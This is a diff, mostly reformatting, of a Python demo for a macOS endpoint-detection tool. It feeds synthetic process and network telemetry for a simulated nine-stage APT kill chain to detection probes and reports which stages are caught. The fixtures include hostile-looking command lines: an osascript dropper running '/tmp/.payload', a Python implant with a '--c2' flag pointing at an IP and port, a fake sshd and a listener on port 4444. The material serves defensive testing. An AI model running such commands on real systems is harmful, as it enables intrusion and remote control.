@@ -37,31 +37,31 @@ from amoskys.agents.common.probes import (
 
 # Collectors (data structures)
 from amoskys.agents.os.macos.auth.collector import AuthEvent
-from amoskys.agents.os.macos.filesystem.collector import FileEntry
-from amoskys.agents.os.macos.network.collector import Connection, ProcessBandwidth
-from amoskys.agents.os.macos.persistence.collector import PersistenceEntry
-from amoskys.agents.os.macos.process.collector import ProcessSnapshot
 
 # Probes (the detectors)
 from amoskys.agents.os.macos.auth.probes import (
     CredentialAccessProbe,
     SudoEscalationProbe,
 )
+from amoskys.agents.os.macos.filesystem.collector import FileEntry
 from amoskys.agents.os.macos.filesystem.probes import (
     DownloadsMonitorProbe,
     HiddenFileProbe,
 )
+from amoskys.agents.os.macos.network.collector import Connection, ProcessBandwidth
 from amoskys.agents.os.macos.network.probes import (
     C2BeaconProbe,
     ExfilSpikeProbe,
     LateralSSHProbe,
     NonStandardPortProbe,
 )
+from amoskys.agents.os.macos.persistence.collector import PersistenceEntry
 from amoskys.agents.os.macos.persistence.probes import (
     CronProbe,
     LaunchAgentProbe,
     ShellProfileProbe,
 )
+from amoskys.agents.os.macos.process.collector import ProcessSnapshot
 from amoskys.agents.os.macos.process.probes import (
     BinaryFromTempProbe,
     LOLBinProbe,
@@ -70,25 +70,51 @@ from amoskys.agents.os.macos.process.probes import (
     ScriptInterpreterProbe,
 )
 
-
 # ═══════════════════════════════════════════════════════════════════════
 # ANSI terminal helpers
 # ═══════════════════════════════════════════════════════════════════════
 
 _USE_COLOR = sys.stdout.isatty() and "--no-color" not in sys.argv
 
+
 def _c(code: str, text: str) -> str:
     return f"\033[{code}m{text}\033[0m" if _USE_COLOR else text
 
-def _bold(t: str) -> str: return _c("1", t)
-def _dim(t: str) -> str: return _c("2", t)
-def _red(t: str) -> str: return _c("91", t)
-def _green(t: str) -> str: return _c("92", t)
-def _yellow(t: str) -> str: return _c("93", t)
-def _cyan(t: str) -> str: return _c("96", t)
-def _white(t: str) -> str: return _c("97", t)
-def _bg_red(t: str) -> str: return _c("41;97", t)
-def _bg_green(t: str) -> str: return _c("42;97", t)
+
+def _bold(t: str) -> str:
+    return _c("1", t)
+
+
+def _dim(t: str) -> str:
+    return _c("2", t)
+
+
+def _red(t: str) -> str:
+    return _c("91", t)
+
+
+def _green(t: str) -> str:
+    return _c("92", t)
+
+
+def _yellow(t: str) -> str:
+    return _c("93", t)
+
+
+def _cyan(t: str) -> str:
+    return _c("96", t)
+
+
+def _white(t: str) -> str:
+    return _c("97", t)
+
+
+def _bg_red(t: str) -> str:
+    return _c("41;97", t)
+
+
+def _bg_green(t: str) -> str:
+    return _c("42;97", t)
 
 
 # ═══════════════════════════════════════════════════════════════════════
@@ -97,8 +123,8 @@ def _bg_green(t: str) -> str: return _c("42;97", t)
 
 _HOME = str(Path.home())
 _NOW = datetime(2024, 11, 15, 2, 30, 0, tzinfo=timezone.utc)  # 2:30 AM (off-hours)
-_ATTACKER_IP = "185.220.101.42"        # Known Tor exit / C2
-_LATERAL_IP = "192.168.1.50"           # Internal dev server
+_ATTACKER_IP = "185.220.101.42"  # Known Tor exit / C2
+_LATERAL_IP = "192.168.1.50"  # Internal dev server
 _C2_PORT = 8443
 _IMPLANT_GUID = "obsidian-implant-001"
 
@@ -106,6 +132,7 @@ _IMPLANT_GUID = "obsidian-implant-001"
 @dataclass
 class StageResult:
     """Result of running one kill chain stage."""
+
     stage_num: int
     name: str
     phase: str
@@ -120,20 +147,22 @@ class StageResult:
 @dataclass
 class KillChainStage:
     """One stage of the APT kill chain."""
+
     num: int
     name: str
-    phase: str                 # MITRE tactic
-    techniques: List[str]      # MITRE technique IDs
-    description: str           # What the attacker does
-    agents: List[str]          # Observatory agents involved
-    probes: List[Tuple[MicroProbe, str]]   # (probe, shared_data_key) pairs
-    data_factory: Callable     # Returns Dict[str, Any] shared_data
-    expected_min: int          # Minimum expected events
+    phase: str  # MITRE tactic
+    techniques: List[str]  # MITRE technique IDs
+    description: str  # What the attacker does
+    agents: List[str]  # Observatory agents involved
+    probes: List[Tuple[MicroProbe, str]]  # (probe, shared_data_key) pairs
+    data_factory: Callable  # Returns Dict[str, Any] shared_data
+    expected_min: int  # Minimum expected events
 
 
 # ═══════════════════════════════════════════════════════════════════════
 # Stage definitions
 # ═══════════════════════════════════════════════════════════════════════
+
 
 def _make_stages() -> List[KillChainStage]:
     """Build the 9-stage kill chain.
@@ -165,7 +194,8 @@ def _make_stages() -> List[KillChainStage]:
         }
 
     stage1 = KillChainStage(
-        num=1, name="INITIAL ACCESS",
+        num=1,
+        name="INITIAL ACCESS",
         phase="initial_access",
         techniques=["T1189", "T1204.002"],
         description=(
@@ -191,41 +221,73 @@ def _make_stages() -> List[KillChainStage]:
             "processes": [
                 # osascript running the dropper
                 ProcessSnapshot(
-                    pid=40010, name="osascript", exe="/usr/bin/osascript",
-                    cmdline=["osascript", "-e",
-                             'do shell script "/tmp/.payload stage2"'],
-                    username="developer", ppid=40001, parent_name="curl",
-                    create_time=_NOW.timestamp() + 2, cpu_percent=1.0,
-                    memory_percent=0.2, status="running", cwd="/tmp",
-                    environ=None, is_own_user=True,
+                    pid=40010,
+                    name="osascript",
+                    exe="/usr/bin/osascript",
+                    cmdline=[
+                        "osascript",
+                        "-e",
+                        'do shell script "/tmp/.payload stage2"',
+                    ],
+                    username="developer",
+                    ppid=40001,
+                    parent_name="curl",
+                    create_time=_NOW.timestamp() + 2,
+                    cpu_percent=1.0,
+                    memory_percent=0.2,
+                    status="running",
+                    cwd="/tmp",
+                    environ=None,
+                    is_own_user=True,
                     process_guid="stage2-osascript-001",
                 ),
                 # python3 implant spawned by osascript
                 ProcessSnapshot(
-                    pid=40011, name="python3", exe="/usr/bin/python3",
-                    cmdline=["python3", "/tmp/.payload/agent.py",
-                             "--c2", f"{_ATTACKER_IP}:{_C2_PORT}"],
-                    username="developer", ppid=40010, parent_name="osascript",
-                    create_time=_NOW.timestamp() + 3, cpu_percent=2.0,
-                    memory_percent=0.5, status="running", cwd="/tmp/.payload",
-                    environ=None, is_own_user=True,
+                    pid=40011,
+                    name="python3",
+                    exe="/usr/bin/python3",
+                    cmdline=[
+                        "python3",
+                        "/tmp/.payload/agent.py",
+                        "--c2",
+                        f"{_ATTACKER_IP}:{_C2_PORT}",
+                    ],
+                    username="developer",
+                    ppid=40010,
+                    parent_name="osascript",
+                    create_time=_NOW.timestamp() + 3,
+                    cpu_percent=2.0,
+                    memory_percent=0.5,
+                    status="running",
+                    cwd="/tmp/.payload",
+                    environ=None,
+                    is_own_user=True,
                     process_guid=_IMPLANT_GUID,
                 ),
                 # Binary executing from /tmp
                 ProcessSnapshot(
-                    pid=40012, name="beacon", exe="/tmp/.payload/beacon",
+                    pid=40012,
+                    name="beacon",
+                    exe="/tmp/.payload/beacon",
                     cmdline=["/tmp/.payload/beacon", "--interval", "30"],
-                    username="developer", ppid=40011, parent_name="python3",
-                    create_time=_NOW.timestamp() + 4, cpu_percent=0.5,
-                    memory_percent=0.1, status="running", cwd="/tmp/.payload",
-                    environ=None, is_own_user=True,
+                    username="developer",
+                    ppid=40011,
+                    parent_name="python3",
+                    create_time=_NOW.timestamp() + 4,
+                    cpu_percent=0.5,
+                    memory_percent=0.1,
+                    status="running",
+                    cwd="/tmp/.payload",
+                    environ=None,
+                    is_own_user=True,
                     process_guid="stage2-beacon-001",
                 ),
             ],
         }
 
     stage2 = KillChainStage(
-        num=2, name="EXECUTION",
+        num=2,
+        name="EXECUTION",
         phase="execution",
         techniques=["T1059.002", "T1059.006", "T1218"],
         description=(
@@ -279,7 +341,8 @@ def _make_stages() -> List[KillChainStage]:
         }
 
     stage3 = KillChainStage(
-        num=3, name="PERSISTENCE",
+        num=3,
+        name="PERSISTENCE",
         phase="persistence",
         techniques=["T1543.001", "T1546.004", "T1053.003"],
         description=(
@@ -328,7 +391,8 @@ def _make_stages() -> List[KillChainStage]:
         }
 
     stage4 = KillChainStage(
-        num=4, name="PRIVILEGE ESCALATION",
+        num=4,
+        name="PRIVILEGE ESCALATION",
         phase="privilege_escalation",
         techniques=["T1548.003"],
         description=(
@@ -378,7 +442,8 @@ def _make_stages() -> List[KillChainStage]:
         }
 
     stage5 = KillChainStage(
-        num=5, name="CREDENTIAL ACCESS",
+        num=5,
+        name="CREDENTIAL ACCESS",
         phase="credential_access",
         techniques=["T1555.001"],
         description=(
@@ -399,12 +464,20 @@ def _make_stages() -> List[KillChainStage]:
         return {
             "processes": [
                 ProcessSnapshot(
-                    pid=40020, name="sshd", exe="/tmp/.payload/sshd",
+                    pid=40020,
+                    name="sshd",
+                    exe="/tmp/.payload/sshd",
                     cmdline=["/tmp/.payload/sshd", "--beacon"],
-                    username="developer", ppid=1, parent_name="launchd",
-                    create_time=_NOW.timestamp(), cpu_percent=0.3,
-                    memory_percent=0.2, status="running", cwd="/",
-                    environ=None, is_own_user=True,
+                    username="developer",
+                    ppid=1,
+                    parent_name="launchd",
+                    create_time=_NOW.timestamp(),
+                    cpu_percent=0.3,
+                    memory_percent=0.2,
+                    status="running",
+                    cwd="/",
+                    environ=None,
+                    is_own_user=True,
                     process_guid="stage6-masq-001",
                 ),
             ],
@@ -433,7 +506,8 @@ def _make_stages() -> List[KillChainStage]:
         }
 
     stage6 = KillChainStage(
-        num=6, name="DEFENSE EVASION",
+        num=6,
+        name="DEFENSE EVASION",
         phase="defense_evasion",
         techniques=["T1036", "T1036.005", "T1564.001"],
         description=(
@@ -456,28 +530,37 @@ def _make_stages() -> List[KillChainStage]:
         return {
             "connections": [
                 Connection(
-                    pid=40020, process_name="ssh", user="developer",
+                    pid=40020,
+                    process_name="ssh",
+                    user="developer",
                     protocol="TCP",
                     local_addr="192.168.1.10:52341",
                     remote_addr=f"{_LATERAL_IP}:22",
                     state="ESTABLISHED",
-                    local_ip="192.168.1.10", local_port=52341,
-                    remote_ip=_LATERAL_IP, remote_port=22,
+                    local_ip="192.168.1.10",
+                    local_port=52341,
+                    remote_ip=_LATERAL_IP,
+                    remote_port=22,
                 ),
                 Connection(
-                    pid=40021, process_name="ssh", user="developer",
+                    pid=40021,
+                    process_name="ssh",
+                    user="developer",
                     protocol="TCP",
                     local_addr="192.168.1.10:52342",
                     remote_addr="192.168.1.51:22",
                     state="ESTABLISHED",
-                    local_ip="192.168.1.10", local_port=52342,
-                    remote_ip="192.168.1.51", remote_port=22,
+                    local_ip="192.168.1.10",
+                    local_port=52342,
+                    remote_ip="192.168.1.51",
+                    remote_port=22,
                 ),
             ],
         }
 
     stage7 = KillChainStage(
-        num=7, name="LATERAL MOVEMENT",
+        num=7,
+        name="LATERAL MOVEMENT",
         phase="lateral_movement",
         techniques=["T1021.004", "T1570"],
         description=(
@@ -498,28 +581,37 @@ def _make_stages() -> List[KillChainStage]:
         return {
             "connections": [
                 Connection(
-                    pid=40012, process_name="beacon", user="developer",
+                    pid=40012,
+                    process_name="beacon",
+                    user="developer",
                     protocol="TCP",
                     local_addr="192.168.1.10:52400",
                     remote_addr=f"{_ATTACKER_IP}:{_C2_PORT}",
                     state="ESTABLISHED",
-                    local_ip="192.168.1.10", local_port=52400,
-                    remote_ip=_ATTACKER_IP, remote_port=_C2_PORT,
+                    local_ip="192.168.1.10",
+                    local_port=52400,
+                    remote_ip=_ATTACKER_IP,
+                    remote_port=_C2_PORT,
                 ),
                 Connection(
-                    pid=40020, process_name="sshd", user="developer",
+                    pid=40020,
+                    process_name="sshd",
+                    user="developer",
                     protocol="TCP",
                     local_addr="0.0.0.0:4444",
                     remote_addr="",
                     state="LISTEN",
-                    local_ip="0.0.0.0", local_port=4444,
-                    remote_ip="", remote_port=0,
+                    local_ip="0.0.0.0",
+                    local_port=4444,
+                    remote_ip="",
+                    remote_port=0,
                 ),
             ],
         }
 
     stage8 = KillChainStage(
-        num=8, name="COMMAND & CONTROL",
+        num=8,
+        name="COMMAND & CONTROL",
         phase="command_and_control",
         techniques=["T1071", "T1571", "T1573"],
         description=(
@@ -552,7 +644,8 @@ def _make_stages() -> List[KillChainStage]:
         }
 
     stage9 = KillChainStage(
-        num=9, name="EXFILTRATION",
+        num=9,
+        name="EXFILTRATION",
         phase="exfiltration",
         techniques=["T1048", "T1048.002"],
         description=(
@@ -565,18 +658,18 @@ def _make_stages() -> List[KillChainStage]:
         expected_min=1,
     )
 
-    return [stage1, stage2, stage3, stage4, stage5, stage6,
-            stage7, stage8, stage9]
+    return [stage1, stage2, stage3, stage4, stage5, stage6, stage7, stage8, stage9]
 
 
 # ═══════════════════════════════════════════════════════════════════════
 # Execution engine
 # ═══════════════════════════════════════════════════════════════════════
 
+
 def _run_baseline(stage: KillChainStage) -> None:
     """Run baseline scan for all baseline-diff probes in a stage."""
     for probe, sdk in stage.probes:
-        if hasattr(probe, '_first_run') and probe._first_run:
+        if hasattr(probe, "_first_run") and probe._first_run:
             empty_ctx = ProbeContext(
                 device_id="obsidian-host",
                 agent_name="obsidian_demo",
@@ -681,15 +774,15 @@ _SEVERITY_COLOR = {
 }
 
 _PHASE_LABELS = {
-    "initial_access":       "Initial Access",
-    "execution":            "Execution",
-    "persistence":          "Persistence",
+    "initial_access": "Initial Access",
+    "execution": "Execution",
+    "persistence": "Persistence",
     "privilege_escalation": "Privilege Escalation",
-    "credential_access":    "Credential Access",
-    "defense_evasion":      "Defense Evasion",
-    "lateral_movement":     "Lateral Movement",
-    "command_and_control":  "Command & Control",
-    "exfiltration":         "Exfiltration",
+    "credential_access": "Credential Access",
+    "defense_evasion": "Defense Evasion",
+    "lateral_movement": "Lateral Movement",
+    "command_and_control": "Command & Control",
+    "exfiltration": "Exfiltration",
 }
 
 
@@ -714,10 +807,12 @@ def _print_stage_result(sr: StageResult) -> None:
     phase_label = _PHASE_LABELS.get(sr.phase, sr.phase)
     status = _bg_green(" DETECTED ") if sr.passed else _bg_red(" MISSED ")
 
-    print(f"  {_bold(f'Stage {sr.stage_num}/9')} {_white(sr.name)} "
-          f"{_dim(f'[{phase_label}]')}  {status}")
+    print(
+        f"  {_bold(f'Stage {sr.stage_num}/9')} {_white(sr.name)} "
+        f"{_dim(f'[{phase_label}]')}  {status}"
+    )
     print(f"  {_dim('Techniques:')} {', '.join(sr.techniques)}")
-    print(f"  {_dim('Agents:')    } {', '.join(sr.agents)}")
+    print(f"  {_dim('Agents:')} {', '.join(sr.agents)}")
 
     if sr.events:
         for ev in sr.events:
@@ -728,8 +823,10 @@ def _print_stage_result(sr: StageResult) -> None:
             conf = f"{ev.confidence:.0%}"
             summary = _extract_summary(ev)
 
-            print(f"    {color_fn(f'[{sev}]')} {probe}::{etype} "
-                  f"{_dim(f'({conf})')}  {summary}")
+            print(
+                f"    {color_fn(f'[{sev}]')} {probe}::{etype} "
+                f"{_dim(f'({conf})')}  {summary}"
+            )
     else:
         print(f"    {_dim('(no events)')}")
 
@@ -758,8 +855,9 @@ def _extract_summary(ev: TelemetryEvent) -> str:
 
     if "remote_ip" in d:
         port = d.get("remote_port", "")
-        parts.append(f"remote={d['remote_ip']}:{port}" if port else
-                      f"remote={d['remote_ip']}")
+        parts.append(
+            f"remote={d['remote_ip']}:{port}" if port else f"remote={d['remote_ip']}"
+        )
 
     if "username" in d and "process_name" not in d and "name" not in d:
         parts.append(f"user={d['username']}")
@@ -803,11 +901,15 @@ def _print_verdict(results: List[StageResult], elapsed: float) -> None:
 
     print(f"  {badge}")
     print()
-    print(f"  Kill Chain Coverage:  {_bold(f'{detected_stages}/{len(results)}')} stages")
+    print(
+        f"  Kill Chain Coverage:  {_bold(f'{detected_stages}/{len(results)}')} stages"
+    )
     print(f"  Total Alerts:         {_bold(str(total_events))}")
     print(f"  MITRE Techniques:     {_bold(str(len(all_techniques)))} unique")
-    print(f"  Agents Contributing:  {_bold(str(len(all_agents)))} "
-          f"({', '.join(all_agents)})")
+    print(
+        f"  Agents Contributing:  {_bold(str(len(all_agents)))} "
+        f"({', '.join(all_agents)})"
+    )
     print(f"  Mean Confidence:      {_bold(f'{avg_conf:.0%}')}")
     print(f"  Execution Time:       {_bold(f'{elapsed:.3f}s')}")
     print()
@@ -848,42 +950,50 @@ def _to_json(results: List[StageResult], elapsed: float) -> str:
     for r in results:
         events = []
         for ev in r.events:
-            events.append({
-                "event_type": ev.event_type,
-                "severity": ev.severity.value,
-                "probe_name": ev.probe_name,
-                "confidence": ev.confidence,
-                "mitre_techniques": ev.mitre_techniques,
-                "data_keys": sorted(ev.data.keys()),
-            })
-        stages.append({
-            "stage": r.stage_num,
-            "name": r.name,
-            "phase": r.phase,
-            "techniques": r.techniques,
-            "agents": r.agents,
-            "passed": r.passed,
-            "event_count": len(r.events),
-            "events": events,
-        })
+            events.append(
+                {
+                    "event_type": ev.event_type,
+                    "severity": ev.severity.value,
+                    "probe_name": ev.probe_name,
+                    "confidence": ev.confidence,
+                    "mitre_techniques": ev.mitre_techniques,
+                    "data_keys": sorted(ev.data.keys()),
+                }
+            )
+        stages.append(
+            {
+                "stage": r.stage_num,
+                "name": r.name,
+                "phase": r.phase,
+                "techniques": r.techniques,
+                "agents": r.agents,
+                "passed": r.passed,
+                "event_count": len(r.events),
+                "events": events,
+            }
+        )
 
     total_events = sum(len(r.events) for r in results)
     detected = sum(1 for r in results if r.passed)
 
-    return json.dumps({
-        "operation": "OBSIDIAN_TEMPEST",
-        "stages_detected": detected,
-        "stages_total": len(results),
-        "total_events": total_events,
-        "execution_time_s": round(elapsed, 3),
-        "all_passed": all(r.passed for r in results),
-        "stages": stages,
-    }, indent=2)
+    return json.dumps(
+        {
+            "operation": "OBSIDIAN_TEMPEST",
+            "stages_detected": detected,
+            "stages_total": len(results),
+            "total_events": total_events,
+            "execution_time_s": round(elapsed, 3),
+            "all_passed": all(r.passed for r in results),
+            "stages": stages,
+        },
+        indent=2,
+    )
 
 
 # ═══════════════════════════════════════════════════════════════════════
 # Main
 # ═══════════════════════════════════════════════════════════════════════
+
 
 def main() -> int:
     quiet = "--quiet" in sys.argv
@@ -924,8 +1034,10 @@ def main() -> int:
     if quiet:
         detected = sum(1 for r in results if r.passed)
         total_events = sum(len(r.events) for r in results)
-        print(f"{detected}/{len(results)} stages detected, "
-              f"{total_events} events, {elapsed:.3f}s")
+        print(
+            f"{detected}/{len(results)} stages detected, "
+            f"{total_events} events, {elapsed:.3f}s"
+        )
 
     return 0 if all_passed else 1
 
